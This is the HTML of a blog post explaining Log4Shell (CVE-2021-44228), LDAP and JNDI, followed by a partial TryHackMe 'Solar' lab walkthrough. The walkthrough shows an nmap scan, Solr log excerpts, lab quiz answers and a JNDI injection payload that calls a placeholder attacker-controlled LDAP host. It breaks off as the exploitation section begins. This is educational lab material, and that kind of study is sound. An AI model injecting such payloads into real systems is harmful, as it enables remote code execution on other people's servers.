@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<meta name="theme-color" content="#494f5c">
+	<meta name="msapplication-TileColor" content="#494f5c">
+<meta itemprop="name" content="Log4Shell 0-Day Vulnerability 💀 (CVE-2021-44228)">
+<meta itemprop="description" content="Log4Shell (CVE-2021-44228) is a zero-day vulnerability in Apache Log4j 2, a popular Java logging framework. It is a remote code execution (RCE) vulnerability involving arbitrary code execution earning a severity score of 10/10.
+ What is LDAP Server &amp; How Does it Works? The LDAP (Lightweight Directory Access Protocol) is a open, vendor-neutral, software protocol used for directory service authentication.Organizations store usernames, passwords, email addresses, printer connections, and other static information inside the directories."><meta itemprop="datePublished" content="2021-12-19T15:30:58&#43;05:30" />
+<meta itemprop="dateModified" content="2021-12-19T15:30:58&#43;05:30" />
+<meta itemprop="wordCount" content="1952">
+<meta itemprop="keywords" content="Log4Shell,LDAP,JNDI,Apache Log4j exploit,CVE-2021-44228,0-day vulnerability,RCE,PoC,THM,Writeup,RiteshPuvvada," /><meta property="og:title" content="Log4Shell 0-Day Vulnerability 💀 (CVE-2021-44228)" />
+<meta property="og:description" content="Log4Shell (CVE-2021-44228) is a zero-day vulnerability in Apache Log4j 2, a popular Java logging framework. It is a remote code execution (RCE) vulnerability involving arbitrary code execution earning a severity score of 10/10.
+ What is LDAP Server &amp; How Does it Works? The LDAP (Lightweight Directory Access Protocol) is a open, vendor-neutral, software protocol used for directory service authentication.Organizations store usernames, passwords, email addresses, printer connections, and other static information inside the directories." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://riteshpuvvada.github.io/posts/log4j/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-12-19T15:30:58&#43;05:30" />
+<meta property="article:modified_time" content="2021-12-19T15:30:58&#43;05:30" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Log4Shell 0-Day Vulnerability 💀 (CVE-2021-44228)"/>
+<meta name="twitter:description" content="Log4Shell (CVE-2021-44228) is a zero-day vulnerability in Apache Log4j 2, a popular Java logging framework. It is a remote code execution (RCE) vulnerability involving arbitrary code execution earning a severity score of 10/10.
+ What is LDAP Server &amp; How Does it Works? The LDAP (Lightweight Directory Access Protocol) is a open, vendor-neutral, software protocol used for directory service authentication.Organizations store usernames, passwords, email addresses, printer connections, and other static information inside the directories."/>
+
+	<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+	<link rel="manifest" href="/site.webmanifest">
+	<link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+	<link rel="shortcut icon" href="/favicon.ico">
+
+	<title>Log4Shell 0-Day Vulnerability 💀 (CVE-2021-44228)</title>
+	<link rel="stylesheet" href="https://riteshpuvvada.github.io/css/style.min.eac77496566fd7d5768fd650ddb0b2b181ca6a2d7c5fdd6fe6b8ba4bf47e566f.css" integrity="sha256-6sd0llZv19V2j9ZQ3bCysYHKai18X91v5ri6S/R+Vm8=" crossorigin="anonymous">
+	
+</head>
+
+<body id="page">
+	
+	<header id="site-header" class="animated slideInUp">
+		<div class="hdr-wrapper section-inner">
+			<div class="hdr-left">
+				<div class="site-branding">
+					<a href="https://riteshpuvvada.github.io/">Nightmare</a>
+				</div>
+				<nav class="site-nav hide-in-mobile">
+					
+				<a href="https://riteshpuvvada.github.io/about">About</a>
+				<a href="https://riteshpuvvada.github.io/posts">Blog</a>
+				<a href="https://riteshpuvvada.github.io/contact">Contact</a>
+
+				</nav>
+			</div>
+			<div class="hdr-right hdr-icons">
+				<span class="hdr-social hide-in-mobile"><a href="https://www.linkedin.com/in/ritesh-puvvada/" target="_blank" rel="noopener me" title="Linkedin"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg></a><a href="https://www.instagram.com/riteshpuvvada/" target="_blank" rel="noopener me" title="Instagram"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path><line x1="17.5" y1="6.5" x2="17.5" y2="6.5"></line></svg></a><a href="https://github.com/RiteshPuvvada" target="_blank" rel="noopener me" title="Github"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a><a href="mailto:riteshpuvvada@outlook.com" target="_blank" rel="noopener me" title="Email"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg></a><a href="https://twitter.com/RiteshPuvvada" target="_blank" rel="noopener me" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg></a><a href="https://stackoverflow.com/users/14728649/ritesh" target="_blank" rel="noopener me" title="Stackoverflow"><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2.913 16.041v6.848h17.599v-6.848M7.16 18.696h8.925M7.65 13.937l8.675 1.8M9.214 9.124l8.058 3.758M12.086 4.65l6.849 5.66M15.774 1.111l5.313 7.162"/></svg></a></span><button id="menu-btn" class="hdr-btn" title="Menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>
+			</div>
+		</div>
+	</header>
+	<div id="mobile-menu" class="animated fast">
+		<ul>
+			<li><a href="https://riteshpuvvada.github.io/about">About</a></li>
+			<li><a href="https://riteshpuvvada.github.io/posts">Blog</a></li>
+			<li><a href="https://riteshpuvvada.github.io/contact">Contact</a></li>
+		</ul>
+	</div>
+
+
+	<main class="site-main section-inner animated fadeIn faster">
+		<article class="thin">
+			<header class="post-header">
+				<div class="post-meta"><span>Dec 19, 2021</span></div>
+				<h1>Log4Shell 0-Day Vulnerability 💀 (CVE-2021-44228)</h1>
+			</header>
+			<div class="content">
+				<p>Log4Shell <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228">(CVE-2021-44228)</a> is a zero-day vulnerability in <a href="https://logging.apache.org/log4j/2.x/">Apache Log4j 2</a>, a popular Java logging framework. It is a remote code execution (RCE) vulnerability involving arbitrary code execution earning a severity score of 10/10.</p>
+<p><img src="/img/blog/LOG/Log4j.png" alt="img"></p>
+<hr>
+<h2 id="what-is-ldap-server--how-does-it-works">What is LDAP Server &amp; How Does it Works?<a href="#what-is-ldap-server--how-does-it-works" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p>The LDAP (Lightweight Directory Access Protocol) is a open, vendor-neutral, software protocol used for directory service authentication.Organizations store usernames, passwords, email addresses, printer connections, and other static information inside the directories.</p>
+<p>LDAP can address authentication as well.This enables clients to connect once and access many different files on the server.</p>
+<figure class="right"><img src="/img/blog/LOG/Ldap.png"
+         alt="image"/><figcaption>
+            <p>The LDAP Process Explained</p>
+        </figcaption>
+</figure>
+
+<p><strong>LDAP is vendor-neutral, so it can be utilized with a variety of different directory programs -</strong></p>
+<ul>
+<li>
+<p><strong>Descriptive -</strong> Multiple points, such as name and location, come together to define an asset.</p>
+</li>
+<li>
+<p><strong>Static -</strong> The information doesn’t change much and when it does, the shifts are subtle.</p>
+</li>
+<li>
+<p><strong>Valuable -</strong> Data stored within the directory is critical to core business functions and it&rsquo;s touched over and over again.</p>
+</li>
+</ul>
+<p>The average employee connects to LDAP handfuls or even many times a day.That individual may not have the foggiest idea about the connection that has happened even though the steps to complete a query are intricate and complex.</p>
+<p>An LDAP query typically involves:</p>
+<ol>
+<li>
+<p><strong>Session connection -</strong> The user connects to the server via an LDAP port (typically port TCP/389).</p>
+</li>
+<li>
+<p><strong>Request -</strong> The client submits a query, such as an email lookup to the server.</p>
+</li>
+<li>
+<p><strong>Response -</strong> The LDAP protocol searches the Directory for the relevant information and delivers it to the user.</p>
+</li>
+<li>
+<p><strong>Completion -</strong> After receiving the response, the user disconnects from the LDAP port.</p>
+</li>
+</ol>
+<hr>
+<h2 id="what-is-jndi-">What is JNDI ?<a href="#what-is-jndi-" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p>The Java Naming and Directory Interface (JNDI) is a Java API for a directory service that allows Java software clients to discover and look up data and resources (in the form of Java objects) via a name.</p>
+<figure class="left"><img src="/img/blog/LOG/Jndi.png"
+         alt="image"/><figcaption>
+            <p>JNDI Implementation Possibilities</p>
+        </figcaption>
+</figure>
+
+<p>Like all Java APIs that interface with host systems, JNDI is independent of the underlying implementation. Additionally, it specifies a service provider interface (SPI) that allows directory service implementations to be plugged into the framework. The information looked up via JNDI may be supplied by a server, a flat file, or a database; the choice is up to the implementation used.<a href="https://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface">[Source]</a></p>
+<h3 id="architecture">Architecture<a href="#architecture" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>The JNDI architecture consists of an API and a service provider interface (SPI). Java applications use the JNDI API to access a variety of naming and directory services. The SPI enables a variety of naming and directory services to be plugged in transparently, thereby allowing the Java application using the JNDI API to access their services</p>
+<h3 id="packaging">Packaging<a href="#packaging" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>To use the JNDI, you must have the JNDI classes and one or more service providers. The JDK includes service providers for the following naming/directory services</p>
+<ul>
+<li>Lightweight Directory Access Protocol (LDAP)</li>
+<li>Common Object Request Broker Architecture (CORBA)</li>
+<li>Common Object Services (COS) name service</li>
+<li>Java Remote Method Invocation (RMI) Registry</li>
+<li>Domain Name Service (DNS)</li>
+</ul>
+<hr>
+<h1 id="solar-exploiting-log4j--a-walkthrough">Solar, exploiting log4j : A Walkthrough<a href="#solar-exploiting-log4j--a-walkthrough" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h1>
+<p>The detailed write-up of the TryHackMe room <em><strong>Solar, exploiting log4j</strong></em></p>
+<p><a href="https://tryhackme.com/room/solar">Link to the room</a></p>
+<h2 id="reconnaissance">Reconnaissance<a href="#reconnaissance" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<ul>
+<li>Basic Nmap scan</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/log4j<span class="o">]</span>
+└─# nmap -sV -A -T5 10.10.129.133
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-12-20 13:48 IST
+Warning: 10.10.129.133 giving up on port because retransmission cap hit <span class="o">(</span>2<span class="o">)</span>.
+Stats: 0:00:49 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Script Scan
+NSE Timing: About 99.64% <span class="k">done</span><span class="p">;</span> ETC: 13:49 <span class="o">(</span>0:00:00 remaining<span class="o">)</span>
+Nmap scan report <span class="k">for</span> 10.10.129.133
+Host is up <span class="o">(</span>0.25s latency<span class="o">)</span>.
+Not shown: <span class="m">974</span> closed ports
+PORT      STATE    SERVICE        VERSION
+22/tcp    open     ssh            OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey:
+<span class="p">|</span>   <span class="m">2048</span> e2:35:e1:4f:4e:87:45:9e:5f:2c:97:e0:da:a9:df:d5 <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span>   <span class="m">256</span> b2:fd:9b:75:1c:9e:80:19:5d:13:4e:8d:a0:83:7b:f9 <span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_  <span class="m">256</span> 75:20:0b:43:14:a9:8a:49:1a:d9:29:33:e1:b9:1a:b6 <span class="o">(</span>ED25519<span class="o">)</span>
+111/tcp   open     rpcbind        2-4 <span class="o">(</span>RPC <span class="c1">#100000)</span>
+<span class="p">|</span> rpcinfo:
+<span class="p">|</span>   program version    port/proto  service
+<span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp   rpcbind
+<span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp   rpcbind
+<span class="p">|</span>   <span class="m">100000</span>  3,4          111/tcp6  rpcbind
+<span class="p">|</span>_  <span class="m">100000</span>  3,4          111/udp6  rpcbind
+593/tcp   filtered http-rpc-epmap
+765/tcp   filtered webster
+1063/tcp  filtered kyoceranetdev
+1114/tcp  filtered mini-sql
+1417/tcp  filtered timbuktu-srv1
+1443/tcp  filtered ies-lm
+2009/tcp  filtered news
+2068/tcp  filtered avocentkvm
+2710/tcp  filtered sso-service
+2869/tcp  filtered icslap
+3918/tcp  filtered pktcablemmcops
+5214/tcp  filtered unknown
+5280/tcp  filtered xmpp-bosh
+5414/tcp  filtered statusd
+6156/tcp  filtered unknown
+6646/tcp  filtered unknown
+7435/tcp  filtered unknown
+8983/tcp open  http    Apache Solr
+<span class="p">|</span> http-title: Solr Admin
+<span class="p">|</span>_Requested resource was http://10.10.129.133:8983/solr/
+9003/tcp  filtered unknown
+9102/tcp  filtered jetdirect
+16992/tcp filtered amt-soap-http
+27352/tcp filtered unknown
+30718/tcp filtered unknown
+50389/tcp filtered unknown
+52822/tcp filtered unknown
+Aggressive OS guesses: Linux 3.1 <span class="o">(</span>94%<span class="o">)</span>, Linux 3.2 <span class="o">(</span>94%<span class="o">)</span>, AXIS 210A or <span class="m">211</span> Network Camera <span class="o">(</span>Linux 2.6.17<span class="o">)</span> <span class="o">(</span>94%<span class="o">)</span>, Linux 3.10 - 3.13 <span class="o">(</span>94%<span class="o">)</span>, ASUS RT-N56U WAP <span class="o">(</span>Linux 3.4<span class="o">)</span> <span class="o">(</span>93%<span class="o">)</span>, Linux 3.16 <span class="o">(</span>93%<span class="o">)</span>, Linux 2.6.32 <span class="o">(</span>92%<span class="o">)</span>, Linux 2.6.39 - 3.2 <span class="o">(</span>92%<span class="o">)</span>, Linux 3.1 - 3.2 <span class="o">(</span>92%<span class="o">)</span>, Linux 3.2 - 4.9 <span class="o">(</span>92%<span class="o">)</span>
+No exact OS matches <span class="k">for</span> host <span class="o">(</span><span class="nb">test</span> conditions non-ideal<span class="o">)</span>.
+Network Distance: <span class="m">4</span> hops
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE <span class="o">(</span>using port 199/tcp<span class="o">)</span>
+HOP RTT       ADDRESS
+<span class="m">1</span>   273.69 ms 10.6.0.1
+<span class="m">2</span>   ... <span class="m">3</span>
+<span class="m">4</span>   289.39 ms 10.10.129.133
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 50.25 seconds
+
+</code></pre></div><p>From the above scan, we can see port 8938 running <a href="https://solr.apache.org/">Apache Solr</a></p>
+<pre><code>8983/tcp open  http    Apache Solr
+| http-title: Solr Admin
+|_Requested resource was http://10.10.129.133:8983/solr/
+</code></pre><h3 id="what-is-apache-solr">What is Apache Solr?<a href="#what-is-apache-solr" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<blockquote>
+<p>Solr is highly reliable, scalable and fault tolerant, providing distributed indexing, replication and load-balanced querying, automated failover and recovery, centralized configuration and more. Solr powers the search and navigation features of many of the world&rsquo;s largest internet sites</p>
+</blockquote>
+<hr>
+<h2 id="discovery">Discovery<a href="#discovery" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<ul>
+<li>Apache Solr 8.11.0 admin page</li>
+</ul>
+<p><img src="/img/blog/LOG/log1.png" alt="img"></p>
+<ol>
+<li>Question</li>
+</ol>
+<p>You should be able to see clear indicators that log4j is in use within the application for logging activity. What is the <code>-Dsolr.log.dir</code> argument set to, displayed on the front page?</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">/var/solr/logs
+</code></pre></div><ol start="2">
+<li>Question</li>
+</ol>
+<p>One file has a significant number of <code>INFO</code> entries showing repeated requests to one specific URL endpoint. Which file includes contains this repeated entry? (Just the filename itself, no path needed)</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">solr.log
+</code></pre></div><p><em>Few log entries in <code>solr.log</code></em></p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">2021-12-13 03:47:53.989 INFO  <span class="o">(</span>qtp1083962448-21<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
+2021-12-13 03:47:54.819 INFO  <span class="o">(</span>qtp1083962448-16<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
+2021-12-13 03:47:55.284 INFO  <span class="o">(</span>qtp1083962448-19<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
+2021-12-13 03:47:55.682 INFO  <span class="o">(</span>qtp1083962448-22<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
+2021-12-13 03:47:56.075 INFO  <span class="o">(</span>qtp1083962448-20<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
+2021-12-13 03:47:56.459 INFO  <span class="o">(</span>qtp1083962448-23<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
+2021-12-13 03:47:56.844 INFO  <span class="o">(</span>qtp1083962448-14<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
+2021-12-13 03:47:57.253 INFO  <span class="o">(</span>qtp1083962448-17<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
+2021-12-13 03:47:57.548 INFO  <span class="o">(</span>qtp1083962448-18<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
+2021-12-13 03:47:57.758 INFO  <span class="o">(</span>qtp1083962448-21<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
+2021-12-13 03:47:58.058 INFO  <span class="o">(</span>qtp1083962448-16<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">1</span>
+2021-12-13 03:47:58.346 INFO  <span class="o">(</span>qtp1083962448-19<span class="o">)</span> <span class="o">[</span>   <span class="o">]</span> o.a.s.s.HttpSolrCall <span class="o">[</span>admin<span class="o">]</span> <span class="nv">webapp</span><span class="o">=</span>null <span class="nv">path</span><span class="o">=</span>/admin/cores <span class="nv">params</span><span class="o">={}</span> <span class="nv">status</span><span class="o">=</span><span class="m">0</span> <span class="nv">QTime</span><span class="o">=</span><span class="m">0</span>
+</code></pre></div><ol start="3">
+<li>Question</li>
+</ol>
+<p>What &ldquo;path&rdquo; or URL endpoint is indicated in these repeated entries?</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">/admin/cores
+</code></pre></div><ol start="4">
+<li>Question</li>
+</ol>
+<p>Viewing these log entries, what field name indicates some data entrypoint that you as a user could control? (Just the field name)</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">params
+</code></pre></div><hr>
+<h2 id="proof-of-concept">Proof of Concept<a href="#proof-of-concept" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p><code>http://10.10.132.1:8983/solr/admin/cores?cmd=$\{payload}</code></p>
+<p>The log4j package adds extra logic to logs by &ldquo;parsing&rdquo; entries, ultimately to enrich the data &ndash; but may additionally take actions and even evaluate code based on the entry data. This is the gist of CVE-2021-44228. Other syntax might be in fact executed just as it is entered into log files.</p>
+<p>Some examples of this syntax are:</p>
+<ul>
+<li><code>${sys:os.name}</code></li>
+<li><code>${sys:user.name}</code></li>
+<li><code>${log4j:configParentLocation}</code></li>
+<li><code>${ENV:PATH}</code></li>
+<li><code>${ENV:HOSTNAME}</code></li>
+<li><code>${java:version}</code></li>
+</ul>
+<p>General format of the payload to abuse log4j vulnerability.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="si">${</span><span class="nv">jndi</span><span class="p">:</span><span class="nv">ldap</span><span class="p">://ATTACKERCONTROLLEDHOST</span><span class="si">}</span>
+</code></pre></div><p><img src="/img/blog/LOG/log2.png" alt="img"></p>
+<hr>
+<h2 id="exploitation">Exploitation<a href="#exploitation" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p><strong>We can now build upon this foundation to respond with a real LDAP handler.</strong></p>
